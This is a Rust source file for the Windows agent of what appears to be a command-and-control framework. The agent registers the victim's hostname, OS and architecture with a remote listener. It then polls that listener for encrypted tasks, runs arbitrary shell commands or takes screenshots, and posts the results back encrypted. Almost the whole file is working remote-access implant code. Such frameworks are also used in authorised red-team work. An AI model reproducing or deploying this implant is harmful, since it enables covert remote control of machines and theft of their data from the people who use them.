// References:
//  - https://github.com/Steve-xmh/alhc/blob/main/src/windows/mod.rs
//  - https://github.com/youyuanwu/winasio-rs/blob/c4bb4cd0d9bf7b0e944d2fd4b9487f2cfa7c4f9e/src/winhttp/mod.rs
use std::{thread, time};
use windows::core::{Error, HSTRING};

use crate::{
    core::{
        handlers::win::{
            async_handler::HRequestAsync,
            handler::{HConnect, HInternet, HRequest, HSession},
        },
        postdata::{CipherData, PlainData, RegisterAgentData},
        systeminfo::systeminfo_windows::get_computer_name,
        tasks::{
            screenshot::screenshot,
            win::shell::shell,
        },
    },
    Config,
    crypto::aesgcm::{cipher, decipher, EncMessage},
    utils::random::random_name,
};

pub async fn run(config: Config) -> Result<(), Error> {
    let sleep = time::Duration::from_secs(config.sleep);

    let user_agent = HSTRING::from(config.listener.user_agent.to_string());

    let hsession = HSession::new(user_agent)?;
    let mut hconnect = HConnect::new(
        &hsession,
        HSTRING::from(config.listener.host.to_string()),
        config.listener.port,
    )?;

    // Get agent info for registration
    let agent_name = random_name("agent".to_owned());
    let hostname = match get_computer_name() {
        Ok(name) => name,
        Err(_) => "unknown".to_string(),
    };
    let os = std::env::consts::OS.to_string();
    let arch = std::env::consts::ARCH.to_string();
    let listener_url = format!(
        "{}://{}:{}/",
        config.listener.proto.to_string(),
        config.listener.host.to_string(),
        config.listener.port.to_owned(),
    );

    let mut rad = RegisterAgentData::new(
        agent_name.to_string(),
        hostname,
        os,
        arch,
        listener_url,
        config.my_public_key,
    );
    let rad_json = serde_json::to_string(&rad.clone()).unwrap();

    // Agent registration process
    let mut registered = false;
    while !registered {
        thread::sleep(sleep);
    
        // Register agent
        let response = match post(&mut hconnect, "/r".to_owned(), rad_json.to_string()).await {
            Ok(resp) => {
                registered = true;
                resp
            }
            Err(e) => {
                continue;
            }
        };

        // println!("{}", response);
    }

    let plaindata = PlainData::new(agent_name.to_string());
    let plaindata_json = serde_json::to_string(&plaindata).unwrap();

    loop {
        // TODO: Implement graceful shutdown.

        thread::sleep(sleep);

        // Get task
        let task = match post(&mut hconnect, "/t/a".to_owned(), plaindata_json.to_string()).await {
            Ok(resp) => {
                if resp == "" {
                    continue;
                }

                let cipherdata: CipherData = serde_json::from_str(&resp).unwrap();
                let deciphered_task = decipher(
                    EncMessage { ciphertext: cipherdata.c, nonce: cipherdata.n },
                    config.my_secret_key.clone(),
                    config.server_public_key.clone(),
                );
                String::from_utf8(deciphered_task).unwrap()
            },
            Err(e) => {
                continue;
            }
        };

        // println!("Task: {task}");

        // Execute task
        let task_args = match shellwords::split(&task) {
            Ok(args) => args,
            Err(_) => continue,
        };

        if task_args.len() == 0 {
            continue;
        }

        match task_args[0].as_str() {
            "screenshot" => {
                match screenshot().await {
                    Ok(result) => {
                        let cipherdata = CipherData::new(
                            agent_name.to_string(),
                            &result,
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        );
                        let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
                        post(&mut hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
                    }
                    Err(e) => {
                        let cipherdata = CipherData::new(
                            agent_name.to_string(),
                            e.to_string().as_bytes(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        );
                        let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
                        post(&mut hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
                    }
                }
            }
            "shell" => {
                match shell(task_args[1..].join(" ")).await {
                    Ok(result) => {
                        let cipherdata = CipherData::new(
                            agent_name.to_string(),
                            &result,
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        );
                        let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
                        post(&mut hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
                    }
                    Err(e) => {
                        let cipherdata = CipherData::new(
                            agent_name.to_string(),
                            e.to_string().as_bytes(),
                            config.my_secret_key.clone(),
                            config.server_public_key.clone(),
                        );
                        let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
                        post(&mut hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
                    }
                }
            }
            _ => {
                continue;
            }
        }
    }

    hconnect.h.close();
    hsession.h.close();

    Ok(())
}

async fn get(hconnect: &mut HConnect, url_path: String) -> Result<String, Error> {
    let mut hrequest = HRequest::new(
        hconnect,
        HSTRING::from("GET".to_string()),
        HSTRING::from(url_path.to_string()),
        None,
    )?;
    
    hrequest.send_req(
        HSTRING::new(),
        0,
        0)?;
    hrequest.recv_resp()?;

    let mut response = String::new();
    
    loop {
        let mut dw_size = 0;

        if let Err(e) = hrequest.query_data_available(Some(&mut dw_size)) {
            println!("Error querying data available: {}", e.to_string());
        }

        if dw_size == 0 {
            break;
        }

        let mut buffer: Vec<u8> = vec![0; dw_size as usize];

        let r = hrequest.read_data(dw_size, &mut buffer);
        match r {
            Ok(_) => {
                response = response + String::from_utf8_lossy(&buffer).to_string().as_str();
            },
            Err(e) => println!("Error: {:?}", e),
        }

        if dw_size > 0 {
            break;
        }
    }

    hrequest.h.close();

    Ok(response)
}

async fn post(
    hconnect: &mut HConnect,
    url_path: String,
    data: String
) -> Result<String, Error> {
    // TODO: Encrypt and encode the post data

    let hrequest = HRequest::new(
        hconnect,
        HSTRING::from("POST".to_string()),
        HSTRING::from(url_path.to_string()),
        Some(vec![HSTRING::from("application/json")]),
    )?;

    let mut hreq_async = HRequestAsync::new(hrequest);

    let headers = HSTRING::from("Content-Type: application/json".to_string());

    hreq_async.async_send_req(headers, data.len() as u32).await?;
    hreq_async.async_write_data(
        data.as_bytes(),
        data.len() as u32
    ).await?;
    hreq_async.async_recv_resp().await?;

    let mut response = String::new();

    loop {
        let dw_size = hreq_async.async_query_data_available().await?;
        if dw_size == 0 {
            break;
        }

        for _ in 0..dw_size {
            let mut temp_buf = [0 as u8];
            let buf = temp_buf.as_mut_slice();
            let len_read = hreq_async
                .async_read_data(buf.len() as u32, buf).await?;
            assert!(buf.len() == len_read as usize);
            response.push(buf[0] as char);
        }
    }
    
    hreq_async.h.h.close();

    Ok(response)
}

fn close_handler(h: &mut HInternet) {
    h.close();
}